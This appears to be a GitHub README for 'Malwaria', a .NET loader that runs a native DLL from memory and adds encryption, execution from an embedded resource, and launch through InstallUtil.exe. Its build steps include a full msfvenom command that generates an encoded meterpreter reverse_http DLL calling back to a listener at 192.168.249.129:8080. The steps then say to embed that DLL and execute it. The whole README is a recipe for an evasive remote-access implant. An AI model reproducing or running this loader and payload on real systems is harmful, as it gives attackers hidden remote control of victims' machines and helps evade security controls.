# Malwaria
Execute Native DLL from .NET 

Based on https://github.com/Scavanger/MemoryModule.net

Added Crypto Support

Added Ability To Execute From Resource

Added Ability to be launched via InstallUtil.exe


Rough Prototype
1. Create The DLL:

<Embedded Sample>
./msfvenom -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai -i 3 -f dll  -a x86 LHOST=192.168.249.129 LPORT=8080 > msf.dll

2. Add DLL To Project

3. Compile and Execute 


